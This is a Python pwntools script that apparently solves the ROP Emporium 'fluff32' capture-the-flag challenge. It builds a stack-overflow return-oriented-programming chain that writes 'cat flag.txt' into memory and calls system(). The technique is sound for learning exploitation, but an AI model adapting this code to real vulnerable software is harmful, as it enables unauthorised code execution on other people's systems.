from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = gdb.debug('./fluff32', 'b *0x0804864a')
p = process('./fluff32')

def pop_edx(word):
    payload = b''
    payload += xor_edx_edx_addr
    payload += garbage # pop esi
    payload += pop_ebx_addr
    payload += word
    payload += xor_edx_ebx_addr
    payload += garbage # pop ebp
    return payload

def pop_ecx(word):
    payload = b''
    payload += pop_edx(word)
    payload += xchg_edx_ecx_addr
    payload += garbage # pop ebp
    return payload

def mov_0w_there(there):
    there = p32(there)
    payload = b''
    payload += pop_ecx(there)
    payload += mov_ecx_edx_addr
    payload += garbage # pop ebp
    payload += p32(0) # pop ebx
    return payload

def mov_that_there(that,there):
    there = p32(there)
    payload = b''
    payload += pop_ecx(there)
    payload += pop_edx(that)
    payload += mov_ecx_edx_addr
    payload += garbage # pop ebp
    payload += garbage # pop ebx
    return payload

def xor_byte_there(that,there):
    that = p32(that)
    there = p32(there)
    payload = b''
    payload += pop_ecx(there)
    payload += pop_ebx_addr
    payload += that
    return payload

padding = b'A'*44
xor_edx_edx_addr = p32(0x08048671)
pop_ebx_addr = p32(0x080483e1)
xor_edx_ebx_addr = p32(0x0804867b)
xchg_edx_ecx_addr = p32(0x08048689)
mov_ecx_edx_addr = p32(0x08048693)
garbage = p32(0x0)
system = p32(0x08048430)
data_int = 0x0804a028
cmd = b"cat flag.txt"
# cmd = b"/bin/cat flag.txt".ljust(20,b'\x00')

payload = padding
# for i in range(0,len(cmd),4):
#     payload += mov_0w_there(data_int+i)
#     for j in range(4):
#         payload += xor_byte_there(cmd[i+j],data_int+i+j)
for i in range(0,len(cmd),4):
    payload += mov_that_there(cmd[i:i+4],data_int+i)
payload += system
payload += garbage
payload += p32(data_int)

# sys.stdout.buffer.write(payload)
p.sendline(payload)
print(p.recvall().decode())
